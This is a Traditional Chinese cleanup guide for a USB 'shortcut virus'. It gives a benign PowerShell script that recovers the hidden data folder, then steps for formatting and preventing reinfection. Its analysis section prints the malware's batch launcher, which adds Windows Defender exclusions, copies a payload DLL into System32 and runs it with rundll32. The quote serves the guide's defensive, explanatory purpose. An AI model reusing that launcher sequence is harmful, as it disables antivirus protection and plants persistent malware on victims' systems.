# 捷徑病毒清理指引 - 方案2：USB 清理與資料備份

##  重要提醒

**此 USB 已被「捷徑病毒」（LNK Virus）感染！**

如果你看到這份文件，代表你可能：
- 已經點擊了 `TRANSCEND.lnk` 檔案
- 或者正在考慮如何處理這個感染的 USB

---

##  病毒特性分析

### 病毒結構
```
USB 根目錄/
 TRANSCEND.lnk           病毒偽裝的捷徑（誘騙使用者點擊）
 sysvolume/              病毒檔案夾
    u105833.bin         病毒開機執行檔
    u146141.dat         病毒常駐執行檔（會被複製到系統）
    u186269.vbs         病毒啟動腳本
    u863864.bat         病毒啟動腳本（主要入口）
 TRANSCEND/              你的真實資料（可能被隱藏）
```

### 病毒行為
1. **隱藏真實資料夾**：將 `TRANSCEND` 資料夾設為隱藏
2. **建立誘餌捷徑**：建立 `TRANSCEND.lnk` 偽裝成資料夾
3. **自動執行病毒**：點擊捷徑後執行 `u863864.bat`
4. **感染系統**：
   - 複製病毒 DLL 到 `C:\Windows\System32\`
   - 將自己加入 Windows Defender 排除清單
   - 隨機改名以逃避追蹤（例如：u146141.dll）
5. **傳播病毒**：感染其他連接到此電腦的 USB

---

##  解決方案

### 步驟 1：先清理已感染的系統（如果已點擊過）

如果你**已經點擊過** `TRANSCEND.lnk`，請先執行：
```
方案1_清理已感染系統.ps1
```

>  必須以「系統管理員身分」執行！

---

### 步驟 2：備份 USB 中的安全資料

**方法一：使用 PowerShell 自動備份（推薦）**

將 USB 插入電腦後，以系統管理員身分執行以下腳本：

```powershell
# ============================================
# USB 資料備份腳本
# ============================================

# 設定 USB 磁碟機代號（請根據實際情況修改）
$USBDrive = "E:"

# 設定備份目標資料夾
$BackupPath = "D:\USB_備份_$(Get-Date -Format 'yyyyMMdd_HHmmss')"

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  USB 資料備份工具" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "USB 磁碟機: $USBDrive" -ForegroundColor Yellow
Write-Host "備份位置: $BackupPath" -ForegroundColor Yellow
Write-Host ""

# 檢查 USB 是否存在
if (-not (Test-Path $USBDrive)) {
    Write-Host "[錯誤] 找不到 USB 磁碟機 $USBDrive" -ForegroundColor Red
    Write-Host "請確認 USB 已正確連接，並修改腳本中的磁碟機代號" -ForegroundColor Yellow
    pause
    exit 1
}

# 建立備份資料夾
New-Item -Path $BackupPath -ItemType Directory -Force | Out-Null

# 顯示 USB 中的真實資料夾
Write-Host "[1/3] 顯示隱藏的資料夾..." -ForegroundColor Yellow
$transcendFolder = Join-Path $USBDrive "TRANSCEND"
if (Test-Path $transcendFolder) {
    attrib -h -s "$transcendFolder" /s /d
    Write-Host "   已顯示 TRANSCEND 資料夾" -ForegroundColor Green
} else {
    Write-Host "  ! 找不到 TRANSCEND 資料夾" -ForegroundColor Red
}

# 列出所有資料夾（排除病毒資料夾）
Write-Host ""
Write-Host "[2/3] 掃描可備份的資料..." -ForegroundColor Yellow
$folders = Get-ChildItem -Path $USBDrive -Directory -Force | Where-Object {
    $_.Name -notin @("sysvolume", "System Volume Information", "`$RECYCLE.BIN")
}

if ($folders) {
    Write-Host "  發現以下資料夾：" -ForegroundColor Green
    foreach ($folder in $folders) {
        $size = (Get-ChildItem -Path $folder.FullName -Recurse -File -ErrorAction SilentlyContinue | 
                 Measure-Object -Property Length -Sum).Sum
        $sizeInMB = [math]::Round($size / 1MB, 2)
        Write-Host "    - $($folder.Name) ($sizeInMB MB)" -ForegroundColor Cyan
    }
    
    Write-Host ""
    Write-Host "[3/3] 開始備份..." -ForegroundColor Yellow
    
    foreach ($folder in $folders) {
        $destPath = Join-Path $BackupPath $folder.Name
        Write-Host "  正在備份: $($folder.Name)..." -ForegroundColor Gray
        
        try {
            Copy-Item -Path $folder.FullName -Destination $destPath -Recurse -Force
            Write-Host "   已備份: $($folder.Name)" -ForegroundColor Green
        } catch {
            Write-Host "   備份失敗: $($folder.Name)" -ForegroundColor Red
            Write-Host "    錯誤: $($_.Exception.Message)" -ForegroundColor Gray
        }
    }
    
    # 備份根目錄的檔案（排除病毒檔案）
    $rootFiles = Get-ChildItem -Path $USBDrive -File -Force | Where-Object {
        $_.Extension -notin @(".lnk", ".vbs", ".bat", ".bin", ".dat") -or
        $_.Name -notmatch "^u\d+"
    }
    
    if ($rootFiles) {
        Write-Host "  正在備份根目錄檔案..." -ForegroundColor Gray
        foreach ($file in $rootFiles) {
            try {
                Copy-Item -Path $file.FullName -Destination $BackupPath -Force
                Write-Host "   已備份: $($file.Name)" -ForegroundColor Green
            } catch {
                Write-Host "   備份失敗: $($file.Name)" -ForegroundColor Red
            }
        }
    }
    
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host "  備份完成！" -ForegroundColor Green
    Write-Host "============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "備份位置: $BackupPath" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "請檢查備份檔案是否完整，確認無誤後即可格式化 USB" -ForegroundColor White
    
    # 開啟備份資料夾
    explorer $BackupPath
    
} else {
    Write-Host "  ! 未發現可備份的資料夾" -ForegroundColor Yellow
}

Write-Host ""
pause
```

**將此腳本儲存為：** `備份USB資料.ps1`

---

**方法二：手動備份**

1. 開啟「檔案總管」的檔案顯示選項：
   - 點選「檢視」「選項」「檢視」標籤
   - 勾選「顯示隱藏的檔案、資料夾及磁碟機」
   - 取消勾選「隱藏保護的作業系統檔案」
   - 點選「套用」

2. 進入 USB 磁碟機，找到 `TRANSCEND` 資料夾（可能是半透明的）

3. 將 `TRANSCEND` 資料夾複製到電腦的安全位置（例如 `D:\USB_備份\`）

4. **重要**：不要複製以下病毒檔案：
   -  `TRANSCEND.lnk`
   -  `sysvolume` 資料夾
   -  任何 `.vbs`、`.bat`、`.bin`、`.dat` 檔案

---

### 步驟 3：格式化 USB

確認資料已安全備份後：

1. 在「本機」中找到 USB 磁碟機
2. 右鍵點選 USB  選擇「格式化」
3. 檔案系統選擇：**NTFS** 或 **exFAT**
4. 勾選「快速格式化」
5. 點選「開始」

>  格式化會清除所有資料，請務必先備份！

---

### 步驟 4：恢復備份的資料

格式化完成後：

1. 將備份的資料複製回 USB
2. 確認檔案可正常開啟
3. 完成！

---

##  預防措施

### 避免再次感染

1. **保持 Windows Defender 開啟**
   - 不要將任何位置加入排除清單（除非必要）

2. **使用 USB 前先掃描**
   - 插入 USB 後，先右鍵點選磁碟機  選擇「以 Windows Defender 掃描」

3. **不要點擊可疑的捷徑檔案**
   - 如果資料夾圖示上有「箭頭」，很可能是捷徑
   - 真實的資料夾不會有箭頭標記

4. **啟用「檔案副檔名」顯示**
   - 檔案總管  檢視  勾選「副檔名」
   - 這樣可以看到 `.lnk`、`.exe` 等檔案類型

5. **定期更新防毒軟體**
   - Windows Update 會自動更新 Defender 病毒碼

---

##  需要協助？

如果在清理過程中遇到問題：

1. **系統清理失敗**
   - 嘗試在「安全模式」下執行清理腳本
   - 或使用第三方防毒軟體（Malwarebytes、Kaspersky Rescue Disk）

2. **無法刪除病毒檔案**
   - 可能需要使用 Process Explorer 終止佔用的程序
   - 或在 Linux Live USB 環境下刪除

3. **資料無法恢復**
   - 檢查是否在 USB 的 `$RECYCLE.BIN` 資料夾中
   - 或使用檔案救援軟體（Recuva、TestDisk）

---

##  技術說明

### 病毒分析

此病毒的核心腳本 `u863864.bat` 執行以下操作：

```batch
@echo off
chcp 65001
explorer "%~dp0..\TRANSCEND"
if exist "%~dp0u146141.dat" if not exist "C:\Windows\System32\u146141.dll" (
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0';"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32';"
timeout /t 3 /nobreak
copy /Y "%~dp0u146141.dat" "C:\Windows\System32\u146141.dll"
C:\Windows\System32\rundll32.exe C:\Windows\System32\u146141.dll,IdllEntry 1
)
```

**惡意行為：**
1. 開啟 TRANSCEND 資料夾（讓使用者誤以為一切正常）
2. 將病毒路徑加入 Windows Defender 排除清單
3. 複製病毒 DLL 到系統目錄
4. 執行病毒 DLL 的匯出函式 `IdllEntry`

### 檔案命名規則

病毒使用 `u` + 隨機數字的命名方式：
- `u863864.bat` - 啟動腳本
- `u146141.dat` - 病毒本體
- `u186269.vbs` - VBScript 啟動器
- `u105833.bin` - 開機執行檔

這種命名方式讓每個感染的 USB 都有不同的檔名，難以追蹤。

---

**建立日期：** 2026-01-30  
**版本：** 1.0
